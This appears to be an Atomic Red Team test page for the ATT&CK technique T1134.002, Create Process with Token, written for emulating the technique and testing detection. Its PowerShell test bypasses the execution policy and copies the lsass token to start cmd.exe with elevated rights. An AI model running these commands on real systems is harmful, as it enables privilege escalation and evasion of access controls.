# T1134.002 - Create Process with Token
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1134/002)
<blockquote>Adversaries may create a new process with a different token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)

Creating processes with a different token may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used (ex: gathered via other means such as [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003)).</blockquote>

## Atomic Tests

## Atomic Test #1 - Access Token Manipulation
This Action demonstrates how an access token for a specific program can spawn another program under a different owner. 
Adversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. 
This Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe

**Supported Platforms:** Windows

#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
Set-ExecutionPolicy -Scope Process Bypass -Force
$owners = @{}
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
$PathToAtomicsFolder\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
```
